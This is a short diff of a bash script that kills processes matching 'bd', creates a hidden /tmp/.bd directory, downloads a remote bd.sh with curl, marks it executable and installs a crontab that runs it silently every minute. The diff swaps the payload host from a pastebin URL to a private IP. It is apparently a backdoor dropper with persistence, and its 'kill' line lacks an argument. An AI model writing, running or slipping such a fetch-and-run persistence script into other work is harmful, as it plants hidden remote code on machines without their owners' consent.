@@ -1,12 +1,12 @@
 #!/bin/bash
 
-urlprefix='https://pastebin.com/raw'
+urlprefix='http://192.168.100.147'
 
 if [[ $(ps -ef | grep 'bd' | grep -v grep | wc -l) != 0 ]]; then
     kill 
 fi
 [ ! -f /tmp/.bd/crontab ] && mkdir /tmp/.bd
-curl -s -o /tmp/.bd/bd.sh $urlprefix/fcUFJKm0
+curl -s -o /tmp/.bd/bd.sh $urlprefix/bd.sh
 chmod +x /tmp/.bd/bd.sh
 [ ! -f /tmp/.bd/crontab ] && echo '* * * * * /bin/bash /tmp/.bd/bd.sh > /dev/null 2>&1' >> /tmp/.bd/crontab
 crontab /tmp/.bd/crontab
